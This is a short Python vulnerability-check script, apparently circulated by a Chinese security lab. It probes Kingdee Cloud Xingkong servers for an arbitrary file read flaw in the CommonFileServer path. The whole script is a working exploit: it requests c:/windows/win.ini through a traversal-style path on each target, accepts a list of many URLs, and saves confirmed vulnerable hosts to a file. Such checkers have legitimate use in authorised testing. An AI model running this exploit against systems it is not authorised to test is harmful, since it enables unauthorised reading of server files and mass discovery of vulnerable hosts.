import requests
import argparse


def main(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url

    data = url
    poc = "/CommonFileServer/c:/windows/win.ini"
    url = data + poc

    try:
        response = requests.get(url=url)
        if "[fonts]" in response.text:
            print("[+]", "漏洞存在", data)
            with open("data.txt", "a") as f:
                f.write(url + "\n")
        else:
            print("")
    except requests.exceptions.RequestException as e:
        # print("连接失败", data, e)
        print("[-]", "漏洞不存在")


if __name__ == "__main__":
    print("欢迎使用金蝶云星空 CommonFileServer 任意文件读取漏洞检测工具！")
    print("-----------------------------------------------------------")
    print("微信公众号:知攻善防实验室!!")
    print("-----------------------------------------------------------")
    parser = argparse.ArgumentParser(description="检测URL是否存在漏洞")
    parser.add_argument("-u", "--url", required=False, help="需要检测的URL")
    parser.add_argument("-us", "--urls", required=False, help="包含多个URL的文件路径")
    args = parser.parse_args()

    if args.urls:
        with open(args.urls, 'r') as f:
            urls = [line.strip() for line in f.readlines()]
    elif args.url:
        urls = [args.url]
    else:
        print("请在添加 -h 获取提示信息！!!")
        exit()

    for url in urls:
        main(url)
